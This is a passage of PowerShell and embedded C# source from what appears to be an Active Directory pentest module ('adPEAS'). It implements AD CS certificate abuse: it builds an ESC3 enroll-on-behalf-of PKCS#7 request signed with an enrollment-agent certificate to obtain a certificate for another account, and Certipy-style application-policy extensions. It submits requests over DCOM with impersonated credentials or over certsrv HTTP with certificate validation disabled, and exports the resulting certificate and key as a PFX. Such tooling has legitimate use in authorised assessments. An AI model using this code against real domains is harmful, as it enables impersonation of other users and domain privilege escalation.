    policyIdentifier OID, no qualifiers) - the same shape as RFC 5280 certificatePolicies.
    Accepts raw OIDs or a set of friendly names (Client Authentication, Certificate
    Request Agent, Smart Card Logon, ...). Non-critical, matching Certipy.
.OUTPUTS
    DER bytes of the Extension SEQUENCE, or $null if no policy could be resolved.
#>
function New-ApplicationPoliciesExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$PolicyOIDs
    )

    $FunctionPrefix = "[New-ApplicationPoliciesExtension]"

    # Friendly name -> OID (lowercased keys). Raw OIDs are passed through unchanged.
    $nameToOid = @{
        'client authentication'         = '1.3.6.1.5.5.7.3.2'
        'server authentication'         = '1.3.6.1.5.5.7.3.1'
        'smart card logon'              = '1.3.6.1.4.1.311.20.2.2'
        'smartcardlogon'                = '1.3.6.1.4.1.311.20.2.2'
        'certificate request agent'     = '1.3.6.1.4.1.311.20.2.1'
        'enrollment agent'              = '1.3.6.1.4.1.311.20.2.1'
        'code signing'                  = '1.3.6.1.5.5.7.3.3'
        'any purpose'                   = '2.5.29.37.0'
        'pkinit client authentication'  = '1.3.6.1.5.2.3.4'
        'secure email'                  = '1.3.6.1.5.5.7.3.4'
        'email protection'              = '1.3.6.1.5.5.7.3.4'
    }

    $policyInfos = [System.Collections.Generic.List[byte]]::new()
    $resolvedCount = 0

    foreach ($p in $PolicyOIDs) {
        $val = $p.Trim()
        $oid = $null
        if ($val -match '^\d+(\.\d+)+$') {
            $oid = $val
        }
        elseif ($nameToOid.ContainsKey($val.ToLower())) {
            $oid = $nameToOid[$val.ToLower()]
        }
        else {
            Write-Warning "$FunctionPrefix Unknown application policy '$p' (not an OID and not a known friendly name). Skipping."
            continue
        }

        # PolicyInformation ::= SEQUENCE { policyIdentifier OID }
        $policyInfo = New-ASN1Sequence -Data (New-ASN1ObjectIdentifier -OID $oid)
        $policyInfos.AddRange([byte[]]$policyInfo)
        $resolvedCount++
        Write-Log "$FunctionPrefix Application policy: '$p' -> $oid"
    }

    if ($resolvedCount -eq 0) {
        return $null
    }

    # CertificatePolicies ::= SEQUENCE OF PolicyInformation
    $certPolicies = New-ASN1Sequence -Data ($policyInfos.ToArray())

    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.21.10"
    $extnValue = New-ASN1OctetString -Value $certPolicies

    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
}

<#
.SYNOPSIS
    Encodes a string as an ASN.1 BMPString (UTF-16BE). The caller is responsible for
    any trailing null character (Windows EnrollmentNameValuePair values are null-terminated).
#>
function New-ASN1BMPString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [AllowEmptyString()]
        [string]$Value
    )
    $bytes = [System.Text.Encoding]::BigEndianUnicode.GetBytes($Value)
    return [byte[]](@(0x1E) + (New-ASN1Length -Length $bytes.Length) + $bytes)
}

<#
.SYNOPSIS
    Builds an "enroll on behalf of" (ESC3) request: a PKCS#7 SignedData envelope around
    the target's inner PKCS#10 CSR, signed by an enrollment-agent certificate.
.DESCRIPTION
    Mirrors the structure Certipy/certreq produce for enrollment-agent requests:
      ContentInfo (signed_data)
        SignedData
          encapContentInfo.contentType = data (1.2.840.113549.1.7.1), content = inner CSR DER
          certificates = [ agent certificate ]
          SignerInfo (signed by the agent key) with signed attributes:
            - 1.3.6.1.4.1.311.21.10 (szOID_APPLICATION_CERT_POLICIES) = Client Auth EKU OID
            - 1.3.6.1.4.1.311.13.2.1 (szOID_ENROLLMENT_NAME_VALUE_PAIR)
                = EnrollmentNameValuePair { "requestername", "DOMAIN\user" } (BMPString)
            - message-digest / content-type (added automatically by SignedCms)
    The agent certificate must carry the Certificate Request Agent EKU
    (1.3.6.1.4.1.311.20.2.1) for the CA to honour the request.
.OUTPUTS
    Base64 string of the PKCS#7 DER, or $null on failure.
#>
function New-EnrollOnBehalfOfRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [byte[]]$InnerCsrDer,

        [Parameter(Mandatory)]
        [string]$OnBehalfOf,

        [Parameter(Mandatory)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$AgentCert
    )

    $FunctionPrefix = "[New-EnrollOnBehalfOfRequest]"

    if (-not $AgentCert.HasPrivateKey) {
        Write-Warning "$FunctionPrefix Agent certificate has no associated private key - cannot sign the request."
        return $null
    }

    try { Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue } catch { }

    # EnrollmentNameValuePair { name BMPString, value BMPString }, null-terminated
    # (UTF-16BE) to match Windows/Certipy on-the-wire encoding.
    $nameBmp = New-ASN1BMPString -Value ("requestername" + [char]0)
    $valBmp  = New-ASN1BMPString -Value ($OnBehalfOf + [char]0)
    $envpDer = New-ASN1Sequence -Data ([byte[]]($nameBmp + $valBmp))

    # Application cert policies attribute value: the Client Authentication EKU OID
    $clientAuthOidDer = New-ASN1ObjectIdentifier -OID "1.3.6.1.5.5.7.3.2"

    try {
        $contentInfo = New-Object System.Security.Cryptography.Pkcs.ContentInfo -ArgumentList (,[byte[]]$InnerCsrDer)
        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms -ArgumentList $contentInfo, $false
        $signer = New-Object System.Security.Cryptography.Pkcs.CmsSigner -ArgumentList $AgentCert
        $signer.DigestAlgorithm = New-Object System.Security.Cryptography.Oid -ArgumentList "2.16.840.1.101.3.4.2.1"  # SHA256
        $signer.IncludeOption = [System.Security.Cryptography.X509Certificates.X509IncludeOption]::EndCertOnly

        # Note: CryptographicAttributeObjectCollection.Add returns an int index;
        # suppress it with [void] so it does not leak into the function's output.
        $appPolOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.21.10"
        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $appPolOid, ([byte[]]$clientAuthOidDer)))

        $envpOid = New-Object System.Security.Cryptography.Oid -ArgumentList "1.3.6.1.4.1.311.13.2.1"
        [void]$signer.SignedAttributes.Add((New-Object System.Security.Cryptography.AsnEncodedData -ArgumentList $envpOid, ([byte[]]$envpDer)))

        $cms.ComputeSignature($signer)
        $p7 = $cms.Encode()
        Write-Log "$FunctionPrefix Built enroll-on-behalf-of PKCS#7 ($($p7.Length) bytes) for '$OnBehalfOf' signed by '$($AgentCert.Subject)'"
        return [Convert]::ToBase64String($p7)
    }
    catch {
        Write-Warning "$FunctionPrefix Failed to build/sign on-behalf-of request: $_"
        return $null
    }
}

#endregion

#region ===== COM/RPC CERTIFICATE REQUEST (FALLBACK) =====

<#
.SYNOPSIS
    Embedded C# code for ICertRequest COM interface.
.DESCRIPTION
    Provides COM interop for certificate enrollment when Web Enrollment (/certsrv/) is unavailable.
    Uses the Certificate Enrollment COM API (ICertRequest) via DCOM.
#>

$Script:ICertRequestCode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace adPEAS
{
    // Certificate Request disposition codes
    public enum CR_DISPOSITION
    {
        CR_DISP_INCOMPLETE = 0,
        CR_DISP_ERROR = 1,
        CR_DISP_DENIED = 2,
        CR_DISP_ISSUED = 3,
        CR_DISP_ISSUED_OUT_OF_BAND = 4,
        CR_DISP_UNDER_SUBMISSION = 5,
        CR_DISP_REVOKED = 6
    }

    // Certificate Request flags
    public static class CR_FLAGS
    {
        public const int CR_IN_BASE64 = 0x1;
        public const int CR_IN_PKCS10 = 0x100;
        public const int CR_IN_PKCS7 = 0x300;
        public const int CR_OUT_BASE64 = 0x1;
        public const int CR_OUT_CHAIN = 0x100;
    }

    // ICertRequest COM interface
    [ComImport]
    [Guid("014E4840-5523-11CF-8BDB-00AA00C005A4")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICertRequest
    {
        [DispId(0x60020000)]
        int Submit(
            [In] int Flags,
            [In, MarshalAs(UnmanagedType.BStr)] string strRequest,
            [In, MarshalAs(UnmanagedType.BStr)] string strAttributes,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020001)]
        int RetrievePending(
            [In] int RequestId,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020002)]
        int GetLastStatus();

        [DispId(0x60020003)]
        int GetRequestId();

        [DispId(0x60020004)]
        int GetDispositionMessage(
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrDispositionMessage);

        [DispId(0x60020005)]
        int GetCACertificate(
            [In] int fExchangeCertificate,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig,
            [In] int Flags);

        [DispId(0x60020006)]
        int GetCertificate(
            [In] int Flags,
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrCertificate);
    }

    // Certificate Request helper class
    public class CertificateRequest
    {
        public static CertRequestResult SubmitRequest(
            string caServer,
            string caName,
            string csrBase64,
            string templateName,
            int inputFlags)
        {
            var result = new CertRequestResult
            {
                Success = false,
                Disposition = -1,
                ErrorMessage = null,
                CertificateBase64 = null,
                RequestID = -1
            };

            ICertRequest certRequest = null;

            try
            {
                // Create the ICertRequest COM object LOCALLY. The request is routed
                // to the (possibly remote) CA by the strConfig "CAHost\CAName" string,
                // which the certificate client resolves to the CA's ICertRequestD(2)
                // DCOM interface. Activating the client object remotely (passing the CA
                // host as the COM server) is wrong and normally fails with access denied.
                // Any alternate credentials are applied by the caller via thread
                // impersonation (LogonUser/ImpersonateLoggedOnUser) before this call.
                Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request");
                if (certRequestType == null)
                {
                    result.ErrorMessage = "Failed to get COM type CertificateAuthority.Request (certificate enrollment COM API not available on this host)";
                    return result;
                }

                object certRequestObj = Activator.CreateInstance(certRequestType);
                certRequest = (ICertRequest)certRequestObj;

                // Build CA config string: "CAServer\CAName"
                string caConfig = string.Format("{0}\\{1}", caServer, caName);

                // Build certificate attributes
                string attributes = string.Format("CertificateTemplate:{0}", templateName);

                // Submit request. inputFlags lets the caller choose the request
                // format (PKCS#10 for a normal CSR, PKCS#7 for an enroll-on-behalf-of
                // SignedData envelope). Fall back to Base64 PKCS#10 when unset.
                int flags = inputFlags != 0 ? inputFlags : (CR_FLAGS.CR_IN_BASE64 | CR_FLAGS.CR_IN_PKCS10);
                int disposition = certRequest.Submit(flags, csrBase64, attributes, caConfig);

                result.Disposition = disposition;
                result.RequestID = certRequest.GetRequestId();

                // Get disposition message
                string dispositionMessage;
                certRequest.GetDispositionMessage(out dispositionMessage);

                if (disposition == (int)CR_DISPOSITION.CR_DISP_ISSUED)
                {
                    // Certificate was issued - retrieve the leaf certificate as Base64.
                    // CR_OUT_CHAIN is intentionally NOT set: we only need the issued
                    // certificate to pair with our private key, and a single cert is
                    // simpler to decode than a Base64 PKCS#7 chain.
                    string certificate;
                    int outFlags = CR_FLAGS.CR_OUT_BASE64;
                    certRequest.GetCertificate(outFlags, out certificate);

                    result.Success = true;
                    result.CertificateBase64 = certificate;
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_UNDER_SUBMISSION)
                {
                    result.ErrorMessage = string.Format("Certificate request pending (RequestID: {0}): {1}",
                        result.RequestID, dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_DENIED)
                {
                    result.ErrorMessage = string.Format("Certificate request denied: {0}", dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_ERROR)
                {
                    int lastStatus = certRequest.GetLastStatus();
                    result.ErrorMessage = string.Format("Certificate request error (0x{0:X}): {1}",
                        lastStatus, dispositionMessage);
                }
                else
                {
                    result.ErrorMessage = string.Format("Unknown disposition {0}: {1}",
                        disposition, dispositionMessage);
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = string.Format("COM exception: {0}", ex.Message);
            }
            finally
            {
                // Release COM object
                if (certRequest != null)
                {
                    Marshal.ReleaseComObject(certRequest);
                }
            }

            return result;
        }
    }

    // Result class
    public class CertRequestResult
    {
        public bool Success;
        public int Disposition;
        public int RequestID;
        public string CertificateBase64;
        public string ErrorMessage;
    }
}
'@

# Load COM interop type (only once)
if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
    try {
        Add-Type -TypeDefinition $Script:ICertRequestCode -Language CSharp -IgnoreWarnings -ErrorAction Stop
        Write-Log "[Request-ADCSCertificate] ICertRequest COM type loaded successfully"
    }
    catch {
        Write-Log "[Request-ADCSCertificate] Failed to load ICertRequest COM type: $_" -Level Warning
    }
}

<#
.SYNOPSIS
    Decodes a Base64 blob into an X509Certificate2, transparently handling both a
    single DER certificate and a PKCS#7 / degenerate certs-only chain.
.DESCRIPTION
    The certsrv web endpoint returns a single PEM/DER certificate, while the
    ICertRequest COM interface and some CAs return a Base64 PKCS#7 chain. This
    helper normalises both into the leaf (end-entity) X509Certificate2 so the
    private key can be attached uniformly downstream.
#>
function ConvertTo-X509FromBase64 {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Base64
    )

    $FunctionPrefix = "[ConvertTo-X509FromBase64]"

    # Strip PEM headers/whitespace if present
    $clean = $Base64
    if ($clean -match '(?s)-----BEGIN[^-]+-----\s*(.+?)\s*-----END[^-]+-----') {
        $clean = $Matches[1]
    }
    $clean = $clean -replace '\s', ''

    if ([string]::IsNullOrEmpty($clean)) {
        Write-Log "$FunctionPrefix Empty Base64 input" -Level Warning
        return $null
    }

    try {
        $bytes = [Convert]::FromBase64String($clean)
    }
    catch {
        Write-Log "$FunctionPrefix Input is not valid Base64: $_" -Level Warning
        return $null
    }

    # First attempt: single X.509 certificate
    try {
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$bytes)
        Write-Log "$FunctionPrefix Decoded single X.509 certificate (Subject=$($cert.Subject))"
        return $cert
    }
    catch {
        Write-Log "$FunctionPrefix Not a single DER certificate, trying PKCS#7 chain: $_"
    }

    # Second attempt: PKCS#7 / degenerate SignedCms chain - extract the leaf
    try {
        $cms = New-Object System.Security.Cryptography.Pkcs.SignedCms
        $cms.Decode($bytes)
        $coll = $cms.Certificates
        if (-not $coll -or $coll.Count -eq 0) {
            Write-Log "$FunctionPrefix PKCS#7 contained no certificates" -Level Warning
            return $null
        }

        # The leaf is the certificate that is not the issuer of any other cert
        $leaf = $null
        foreach ($candidate in $coll) {
            $isIssuerOfAnother = $false
            foreach ($other in $coll) {
                if ($other.Subject -ne $candidate.Subject -and $other.Issuer -eq $candidate.Subject) {
                    $isIssuerOfAnother = $true
                    break
                }
            }
            if (-not $isIssuerOfAnother) { $leaf = $candidate; break }
        }
        if (-not $leaf) { $leaf = $coll[0] }

        Write-Log "$FunctionPrefix Extracted leaf certificate from PKCS#7 chain of $($coll.Count) (Subject=$($leaf.Subject))"
        return $leaf
    }
    catch {
        Write-Log "$FunctionPrefix Failed to decode as PKCS#7: $_" -Level Warning
        return $null
    }
}

<#
.SYNOPSIS
    Submits a PKCS#10 CSR via ICertRequest COM/RPC interface.
.DESCRIPTION
    Used when Web Enrollment (/certsrv/) is unavailable or when -Method COM is
    forced. Instantiates the ICertRequest client locally and routes the request to
    the CA via the "CAHost\CAName" config string (the CA's ICertRequestD2 DCOM
    interface). When -Credential is supplied, the call runs under a netonly
    impersonation token so alternate credentials reach the CA.
#>
function Submit-COMRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CAName,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
        [string]$TemplateName,

        [PSCredential]$Credential,

        # The request payload is a PKCS#7 SignedData envelope (enroll-on-behalf-of)
        # rather than a bare PKCS#10 CSR.
        [switch]$IsPKCS7
    )

    $FunctionPrefix = "[Submit-COMRequest]"

    # CR_IN_BASE64 (0x1) | CR_IN_PKCS10 (0x100) | CR_IN_PKCS7 (0x300)
    $inputFlags = if ($IsPKCS7) { 0x301 } else { 0x101 }

    Write-Log "$FunctionPrefix Submitting via COM/RPC to config '$CAServer\$CAName' (template '$TemplateName', format=$(if ($IsPKCS7) { 'PKCS#7' } else { 'PKCS#10' }), auth=$(if ($Credential) { 'impersonated credential' } else { 'current context' }))"

    $result = @{
        Success      = $false
        RequestID    = $null
        Disposition  = $null
        Certificate  = $null   # X509Certificate2 on success (decoded from Base64)
        ErrorMessage = $null
    }

    $impersonationToken = [IntPtr]::Zero

    try {
        # Check if COM type is loaded
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
            $result.ErrorMessage = "ICertRequest COM type not loaded - Add-Type failed during initialization"
            Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
            return $result
        }

        # Apply alternate credentials via thread impersonation so the DCOM call to
        # the CA authenticates as the supplied user (netonly, NTLM).
        if ($Credential) {
            try {
                Write-Log "$FunctionPrefix Impersonating supplied credential for DCOM call"
                $impersonationToken = Invoke-NTLMImpersonation -Credential $Credential -Quiet
            }
            catch {
                $result.ErrorMessage = "Failed to impersonate credential for COM/RPC: $($_.Exception.Message)"
                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
                return $result
            }
        }

        # Call C# COM wrapper
        $comResult = [adPEAS.CertificateRequest]::SubmitRequest(
            $CAServer,
            $CAName,
            $CSRBase64,
            $TemplateName,
            $inputFlags
        )

        $result.RequestID = $comResult.RequestID
        $result.Disposition = $comResult.Disposition
        Write-Log "$FunctionPrefix CA returned disposition=$($comResult.Disposition), RequestID=$($comResult.RequestID)"

        if ($comResult.Success) {
            # Decode the Base64 certificate into an X509Certificate2 for a uniform
            # downstream contract with the HTTP path (Bug fix: previously the raw
            # Base64 string leaked into CopyWithPrivateKey/.Thumbprint).
            $decoded = ConvertTo-X509FromBase64 -Base64 $comResult.CertificateBase64
            if ($decoded) {
                $result.Success = $true
                $result.Certificate = $decoded
                Write-Log "$FunctionPrefix Certificate issued and decoded (RequestID: $($comResult.RequestID), Thumbprint: $($decoded.Thumbprint))"
            }
            else {
                $result.ErrorMessage = "CA issued the certificate but the returned data could not be decoded"
                Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Warning
            }
        }
        else {
            $result.ErrorMessage = $comResult.ErrorMessage
            Write-Log "$FunctionPrefix Request failed: $($comResult.ErrorMessage)" -Level Warning
        }
    }
    catch {
        $result.ErrorMessage = "COM invocation failed: $($_.Exception.Message)"
        Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
    }
    finally {
        if ($impersonationToken -ne [IntPtr]::Zero) {
            try {
                Invoke-RevertToSelf -TokenHandle $impersonationToken
                Write-Log "$FunctionPrefix Reverted impersonation token"
            }
            catch {
                Write-Log "$FunctionPrefix Failed to revert impersonation: $_" -Level Warning
            }
        }
    }

    return $result
}

#endregion

#region ===== CERTSRV HTTP COMMUNICATION =====

<#
.SYNOPSIS
    Submits a PKCS#10 CSR to a certsrv web enrollment endpoint.
#>
function Submit-CertsrvRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
        [string]$TemplateName,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$Port = 0,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Submit-CertsrvRequest]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
    $submitUrl = "${protocol}://${CAServer}${portPart}/certsrv/certfnsh.asp"

    Write-Log "$FunctionPrefix Submitting CSR to $submitUrl"

    # Build form data
    $encodedCSR = [System.Uri]::EscapeDataString($CSRBase64)
    $formBody = "Mode=newreq&CertRequest=$encodedCSR&CertAttrib=CertificateTemplate%3A$TemplateName&SaveCert=yes&ThumbPrint="

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    $result = @{
        Success      = $false
        RequestID    = $null
        Status       = $null
        ErrorMessage = $null
        RawResponse  = $null
    }

    try {
        # Enable all TLS versions
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($submitUrl)
        $request.Method = 'POST'
        $request.ContentType = 'application/x-www-form-urlencoded'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 5
        $request.CookieContainer = New-Object System.Net.CookieContainer

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($submitUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        # Write request body
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($formBody)
        $request.ContentLength = $bodyBytes.Length

        $requestStream = $null
        try {
            $requestStream = $request.GetRequestStream()
            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        }
        finally {
            if ($requestStream) {
                try { $requestStream.Close() } catch { }
                try { $requestStream.Dispose() } catch { }
            }
        }

        # Execute request
        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                try {
                    $errStream = $webEx.Response.GetResponseStream()
                    $errReader = New-Object System.IO.StreamReader($errStream)
                    $responseContent = $errReader.ReadToEnd()
                    $errReader.Dispose()
                    $errStream.Dispose()
                }
                catch { }
                finally {
                    try { $webEx.Response.Close() } catch { }
                    try { $webEx.Response.Dispose() } catch { }
                }

                if ($statusCode -eq 401) {
                    $result.ErrorMessage = "HTTP 401 Unauthorized. Try using -Credential parameter or check if the CA requires specific authentication."
                    $result.Status = 'AuthError'
                    return $result
                }
                elseif ($statusCode -eq 403) {
                    $result.ErrorMessage = "HTTP 403 Forbidden. Insufficient permissions for certificate enrollment."
                    $result.Status = 'AuthError'
                    return $result
                }
                else {
                    $result.ErrorMessage = "HTTP $statusCode error from CA server"
                    $result.Status = 'Error'
                    return $result
                }
            }
            else {
                $result.ErrorMessage = "Connection failed: $($webEx.Message)"
                $result.Status = 'Error'
                return $result
            }
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        $result.RawResponse = $responseContent

        # Parse response HTML
        if (-not $responseContent) {
            $result.ErrorMessage = "Empty response from CA server"
            $result.Status = 'Error'
            return $result
        }

        # Check for issued certificate (link to download)
        if ($responseContent -match 'certnew\.cer\?ReqID=(\d+)') {
            $result.Success = $true
            $result.RequestID = [int]$Matches[1]
            $result.Status = 'Issued'
            Write-Log "$FunctionPrefix Certificate issued, Request ID: $($result.RequestID)"
        }
        # Check for pending approval
        elseif ($responseContent -match 'Certificate Pending' -or $responseContent -match 'Your certificate request was received') {
            if ($responseContent -match 'Your Request Id is (\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            elseif ($responseContent -match 'ReqID=(\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            $result.Success = $true
            $result.Status = 'Pending'
            Write-Log "$FunctionPrefix Certificate pending approval, Request ID: $($result.RequestID)"
        }
        # Check for denial
        elseif ($responseContent -match '(?i)denied|(?i)The disposition message is[^<]*?([^<\r\n]+)') {
            $result.Status = 'Denied'
            # Try to extract disposition message
            if ($responseContent -match 'The disposition message is[^"]*"([^"]+)"') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1])"
            }
            elseif ($responseContent -match 'Disposition message:[^\S]*([^\r\n<]+)') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1].Trim())"
            }
            else {
                $result.ErrorMessage = "Certificate request was denied by the CA"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
        else {
            # Unknown response - try to extract any useful info
            $result.Status = 'Error'
            if ($responseContent -match '<title>([^<]+)</title>') {
                $result.ErrorMessage = "Unexpected response: $($Matches[1])"
            }
            else {
                $result.ErrorMessage = "Unexpected response from CA server (no certificate, pending, or denial pattern found)"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
    }
    finally {
        # Restore original TLS settings
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }

    return $result
}

<#
.SYNOPSIS
    Retrieves an issued certificate from the certsrv endpoint.
#>
function Get-CertsrvCertificate {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [int]$RequestID,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$Port = 0,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Get-CertsrvCertificate]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $portPart = if ($Port -gt 0) { ":$Port" } else { "" }
    $retrieveUrl = "${protocol}://${CAServer}${portPart}/certsrv/certnew.cer?ReqID=${RequestID}&Enc=b64"

    Write-Log "$FunctionPrefix Retrieving certificate from $retrieveUrl"

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($retrieveUrl)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($retrieveUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
            Write-Error "$FunctionPrefix Failed to retrieve certificate: $($webEx.Message)"
            return $null
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        if (-not $responseContent) {
            Write-Error "$FunctionPrefix Empty response when retrieving certificate"
            return $null
        }

        # Decode the response (PEM, raw Base64, or PKCS#7) into the leaf certificate
        $cert = ConvertTo-X509FromBase64 -Base64 $responseContent
        if (-not $cert) {
            Write-Error "$FunctionPrefix Could not extract a certificate from the CA response"
            return $null
        }
        Write-Log "$FunctionPrefix Certificate retrieved: Subject=$($cert.Subject), Thumbprint=$($cert.Thumbprint)"
        return $cert
    }
    finally {
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }
}

#endregion

#region ===== PFX BUILD / PENDING KEY / RETRIEVE =====

<#
.SYNOPSIS
    Combines an issued certificate with its private key, writes the PFX, prints a
    summary, and returns a result object. Shared by the request and retrieve paths.
#>
function Save-IssuedCertificatePFX {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$IssuedCert,

        [Parameter(Mandatory)]
        [System.Security.Cryptography.RSA]$RSA,

        [string]$OutputPath,
        [switch]$NoPassword,
        [string]$TemplateName,
        $RequestID,
        [string]$CAServer,
        [switch]$Force
    )

    $FunctionPrefix = "[Save-IssuedCertificatePFX]"

    # Determine PFX password
    if ($NoPassword) {
        $pfxPassword = $null
        Write-Log "$FunctionPrefix Exporting PFX without password (-NoPassword)"
    }
    else {
        $pfxPassword = New-SafePassword -Length 20
        Write-Log "$FunctionPrefix Generated random PFX password"
    }

    # Combine CA-issued cert with our private key
    try {
        $certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($IssuedCert, $RSA)
        if ($pfxPassword) {
            $securePfxPassword = ConvertTo-SecureString -String $pfxPassword -AsPlainText -Force
            $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $securePfxPassword)
        }
        else {
